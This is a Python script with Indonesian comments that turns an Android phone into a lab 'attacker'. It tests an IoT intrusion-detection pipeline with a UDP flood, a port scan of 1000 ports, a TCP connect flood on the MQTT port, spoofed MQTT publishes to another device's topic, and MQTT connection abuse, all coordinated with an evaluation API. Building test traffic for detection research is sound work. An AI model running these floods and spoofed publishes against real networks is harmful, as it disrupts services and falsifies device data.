#!/usr/bin/env python3
"""
attacker.py — Unified Network Guard · Phone Attacker Tool
===========================================================
Jalankan di HP Android via Termux. Mengubah HP menjadi mesin attacker
(subnet 192.168.10.0/24) untuk menjalankan skenario S1-S6 terhadap
Edge PC / subnet IoT (192.168.20.0/24).

TANPA root. Hanya butuh Python 3 (stdlib). Tidak ada pip install.
Teknik no-root: TCP connect flood & UDP flood via socket -> tetap
menghasilkan paket SYN/UDP asli di wire -> tertangkap collector Edge PC
-> memicu rule Suricata + Rule Engine.

Prasyarat jaringan:
  - HP terhubung WiFi ke router upstream TL-WR840N (192.168.10.1)
  - HP dapat ping 192.168.20.100 (Edge PC)
  - Pipeline UNG jalan di Edge PC (./ung.sh start --sim)

Pakai:
  python attacker.py                         # menu interaktif
  python attacker.py --target 192.168.20.100
  python attacker.py --scenario S3            # jalankan satu skenario
  python attacker.py --all                     # S2-S6 berurutan (tanpa koordinasi)
  python attacker.py --auto                    # eval penuh: koordinasi sesi via API Edge PC
  python attacker.py --reps 5                  # repetisi per skenario
"""
import argparse
import json
import socket
import struct
import sys
import time
import urllib.request
import urllib.error

# ─── Konfigurasi default ─────────────────────────────────────────────────────
TARGET   = "192.168.20.100"   # Edge PC (broker MQTT + target serangan)
EDGE_API = "http://192.168.20.100:8000"   # API UNG untuk koordinasi sesi
API_KEY  = "dummy_key"        # sama dengan API_KEY di .env Edge PC
MQTT_PORT = 1883
REPS = 5
DELAY_BETWEEN_REPS = 18.0   # detik (window 120s / 5 reps = 24s/slice)

SCENARIOS = [
    {"id": "S2", "name": "Traffic Spike",          "fn": "s2_spike",
     "desc": "UDP flood byte tinggi ke Edge PC (memicu rule TRAFFIC_SPIKE)"},
    {"id": "S3", "name": "Port Scanning",          "fn": "s3_scan",
     "desc": "TCP connect scan 1000 port (memicu rule PORT_SCAN)"},
    {"id": "S4", "name": "Traffic Flooding",       "fn": "s4_flood",
     "desc": "TCP connect flood ke port 1883 (memicu rule SYN_FLOOD)"},
    {"id": "S5", "name": "Unauthorized MQTT",      "fn": "s5_mqtt_unauth",
     "desc": "Publish MQTT ke topik perangkat lain (memicu Suricata MQTT unauthorized)"},
    {"id": "S6", "name": "MQTT Rate Abuse",        "fn": "s6_mqtt_rate",
     "desc": "200 koneksi MQTT cepat (memicu rule MQTT_RATE_ABUSE)"},
]

# ─── Util ────────────────────────────────────────────────────────────────────
def log(msg):
    print(f"[attacker] {msg}", flush=True)

def detect_my_ip(target):
    """IP lokal HP yang dipakai untuk reach target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, MQTT_PORT))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"

def warn_subnet(my_ip):
    if not my_ip.startswith("192.168.10."):
        log("⚠️  IP HP = %s — BUKAN 192.168.10.x!" % my_ip)
        log("   Hubungkan HP ke WiFi router upstream TL-WR840N (192.168.10.1).")
        log("   Suricata rule attacker hanya match subnet 192.168.10.0/24.")
        log("   Tetap lanjut? (eval bisa jalan tapi alert tidak akan ter-flag attacker)")
        try:
            if input("   lanjut? (y/N): ").strip().lower() != "y":
                sys.exit(0)
        except EOFError:
            pass
    else:
        log("✓ IP HP = %s (subnet attacker 192.168.10.0/24)" % my_ip)

# ─── Mini MQTT client (raw socket, MQTT 3.1.1) ───────────────────────────────
def mqtt_publish(host, port, topic, payload, client_id="attacker", timeout=5):
    """CONNECT + PUBLISH QoS0 lalu tutup. Return True jika berhasil."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        # CONNECT packet
        cid = client_id.encode()
        payload_b = payload.encode() if isinstance(payload, str) else payload
        var = b"MQTT" + bytes([4, 0x02]) + struct.pack(">H", 10)
        body = var + struct.pack(">H", len(cid)) + cid
        s.sendall(bytes([0x10, len(body)]) + body)
        # CONNACK
        ack = s.recv(4)
        if len(ack) < 4 or ack[0] != 0x20 or ack[3] != 0x00:
            s.close()
            return False
        # PUBLISH QoS0
        t = topic.encode()
        rem = 2 + len(t) + len(payload_b)
        s.sendall(bytes([0x30, rem]) + struct.pack(">H", len(t)) + t + payload_b)
        s.close()
        return True
    except Exception:
        return False

# ─── Skenario serangan ───────────────────────────────────────────────────────
def s2_spike(target, rep):
    """Traffic spike: UDP flood paket 1400 byte."""
    log("  S2 rep %d: UDP flood 1400B x 2000 paket" % rep)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1400
    for _ in range(2000):
        try:
            s.sendto(payload, (target, 12345))
        except Exception:
            pass
    s.close()

def s3_scan(target, rep):
    """Port scan: TCP connect 1000 port."""
    log("  S3 rep %d: TCP scan port 1-1000" % rep)
    for port in range(1, 1001):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((target, port))
            s.close()
        except Exception:
            pass

def s4_flood(target, rep):
    """Traffic flooding: TCP connect flood ke port 1883 (100 koneksi cepat)."""
    log("  S4 rep %d: TCP connect flood :1883 x 100" % rep)
    for i in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target, MQTT_PORT))
            # tutup segera -> SYN terkirim, koneksi dibuka-tutup = pola flood
            s.close()
        except Exception:
            pass

def s5_mqtt_unauth(target, rep):
    """Unauthorized MQTT: publish ke topik perangkat lain."""
    log("  S5 rep %d: MQTT publish unauthorized ke iot/esp32-01/telemetry" % rep)
    ok = mqtt_publish(target, MQTT_PORT, "iot/esp32-01/telemetry",
                      '{"fake":true,"from":"attacker"}',
                      client_id="attacker_%d" % rep)
    log("    -> %s" % ("terkirim" if ok else "GAGAL (broker tidak reachable?)"))

def s6_mqtt_rate(target, rep):
    """MQTT rate abuse: 200 koneksi MQTT cepat."""
    log("  S6 rep %d: 200 koneksi MQTT cepat" % rep)
    cnt = 0
    for i in range(200):
        if mqtt_publish(target, MQTT_PORT, "test/anomaly", "x",
                        client_id="abuse_%d_%d" % (rep, i)):
            cnt += 1
    log("    -> %d/200 koneksi terkirim" % cnt)

FN_MAP = {"s2_spike": s2_spike, "s3_scan": s3_scan, "s4_flood": s4_flood,
          "s5_mqtt_unauth": s5_mqtt_unauth, "s6_mqtt_rate": s6_mqtt_rate}

# ─── Koordinasi sesi via API Edge PC ─────────────────────────────────────────
def api_call(method, path, body=None, timeout=5):
    url = EDGE_API.rstrip("/") + path
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("X-API-Key", API_KEY)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)

def api_eval_session(action, sid=None):
    """Kontrol sesi evaluasi di Edge PC via API."""
    if action == "start":
        return api_call("POST", "/api/v1/eval/session/start")
    elif action == "finish":
        return api_call("POST", "/api/v1/eval/session/finish")
    elif action == "begin":
        return api_call("POST", "/api/v1/eval/session/begin/%s" % sid)
    elif action == "end":
        return api_call("POST", "/api/v1/eval/session/end/%s" % sid)
    return 0, "unknown action"

# ─── Runner ──────────────────────────────────────────────────────────────────
def run_scenario(sc, target, reps, coordinate=False):
    fn = FN_MAP[sc["fn"]]
    log("━━━ %s: %s ━━━" % (sc["id"], sc["name"]))
    log("  %s" % sc["desc"])
    if coordinate:
        st, resp = api_eval_session("begin", sc["id"])
        if st != 200:
            log("  ⚠️  API begin gagal (HTTP %s): %s — lanjut tanpa koordinasi" % (st, resp[:80]))
        else:
            log("  ✓ Edge PC: sesi %s dimulai" % sc["id"])
    for r in range(1, reps + 1):
        fn(target, r)
        if r < reps:
            time.sleep(DELAY_BETWEEN_REPS)
    if coordinate:
        st, resp = api_eval_session("end", sc["id"])
        if st == 200:
            log("  ✓ Edge PC: sesi %s selesai" % sc["id"])
    log("  %s selesai (%d rep)" % (sc["id"], reps))

def menu(target, reps):
    while True:
        print("\n" + "═" * 50)
        print(" UNG Phone Attacker  | target=%s reps=%d" % (target, reps))
        print("═" * 50)
        print(" 0. Cek IP HP & jaringan")
        for i, sc in enumerate(SCENARIOS):
            print(" %d. %s — %s" % (i + 1, sc["id"], sc["name"]))
        print(" a. Jalankan SEMUA (S2-S6) tanpa koordinasi")
        print(" A. AUTO — eval penuh (koordinasi sesi via API Edge PC)")
        print(" q. Keluar")
        print("═" * 50)
        choice = input("pilih> ").strip().lower()
        if choice == "q":
            break
        elif choice == "0":
            my = detect_my_ip(target)
            log("IP HP: %s" % my)
            warn_subnet(my)
            # cek reachability
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, MQTT_PORT))
                s.close()
                log("✓ Edge PC %s:1883 reachable" % target)
            except Exception as e:
                log("✗ Edge PC tidak reachable: %s" % e)
        elif choice == "a":
            for sc in SCENARIOS:
                run_scenario(sc, target, reps, coordinate=False)
        elif choice == "a_auto" or choice == "auto" or choice == "biga":
            run_auto(target, reps)
        elif choice.isdigit() and 1 <= int(choice) <= len(SCENARIOS):
            run_scenario(SCENARIOS[int(choice) - 1], target, reps, coordinate=False)
        else:
            print("pilihan tidak dikenal")

def run_auto(target, reps):
    """Eval penuh: S1 (normal) lalu S2-S6, semua terkoordinasi via API."""
    log("════ AUTO EVAL — koordinasi via API Edge PC ════")
    my = detect_my_ip(target)
    warn_subnet(my)
    # cek API
    st, resp = api_eval_session("start")
    if st != 200:
        log("✗ API session/start gagal (HTTP %s): %s" % (st, resp[:120]))
        log("  Pastikan API Edge PC jalan: ./ung.sh start  (lihat EVAL_RUNBOOK.md)")
        log("  Dan endpoint /api/v1/eval/session/* sudah ditambahkan.")
        return
    log("✓ Sesi evaluasi dimulai di Edge PC")
    # S1 normal: cukup tungus 5 menit (tidak ada serangan)
    log("━━━ S1: Normal baseline — TUNGGU 5 menit (biarkan traffic ESP32) ━━━")
    api_eval_session("begin", "S1")
    for i in range(5, 0, -1):
        log("  sisa %d menit..." % i)
        time.sleep(60)
    api_eval_session("end", "S1")
    # S2-S6 serangan
    for sc in SCENARIOS:
        run_scenario(sc, target, reps, coordinate=True)
    # finish
    st, resp = api_eval_session("finish")
    if st == 200:
        log("✓ Sesi evaluasi selesai di Edge PC")
    else:
        log("⚠️  API finish gagal (HTTP %s)" % st)
    log("════ AUTO EVAL selesai ════")
    log("Di Edge PC, jalankan untuk menghitung & mengisi Tabel 1:")
    log("  python ml/evaluator_tabel1.py")
    log("  cd artikel && python fill_tabel1.py")

# ─── Main ────────────────────────────────────────────────────────────────────
def main():
    global EDGE_API, API_KEY
    p = argparse.ArgumentParser(description="UNG Phone Attacker (Termux, no-root)")
    p.add_argument("--target", default=TARGET, help="IP Edge PC (default 192.168.20.100)")
    p.add_argument("--api", default=EDGE_API, help="URL API Edge PC")
    p.add_argument("--api-key", default=API_KEY, help="API key UNG (default: dummy_key, sesuai .env)")
    p.add_argument("--reps", type=int, default=REPS, help="repetisi per skenario (default 5)")
    p.add_argument("--scenario", help="jalankan satu skenario (S2-S6)")
    p.add_argument("--all", action="store_true", help="jalankan S2-S6 berurutan")
    p.add_argument("--auto", action="store_true", help="eval penuh terkoordinasi via API")
    args = p.parse_args()

    EDGE_API = args.api
    API_KEY = args.api_key

    log("target = %s  | API = %s  | reps = %d" % (args.target, args.api, args.reps))
    my = detect_my_ip(args.target)
    log("IP HP = %s" % my)
    warn_subnet(my)

    if args.auto:
        run_auto(args.target, args.reps)
        return
    if args.all:
        for sc in SCENARIOS:
            run_scenario(sc, args.target, args.reps, coordinate=False)
        return
    if args.scenario:
        sid = args.scenario.upper()
        sc = next((s for s in SCENARIOS if s["id"] == sid), None)
        if not sc:
            log("skenario tidak dikenal: %s (pakai S2-S6)" % sid); sys.exit(1)
        run_scenario(sc, args.target, args.reps, coordinate=False)
        return
    # default: menu interaktif
    menu(args.target, args.reps)

if __name__ == "__main__":
    main()
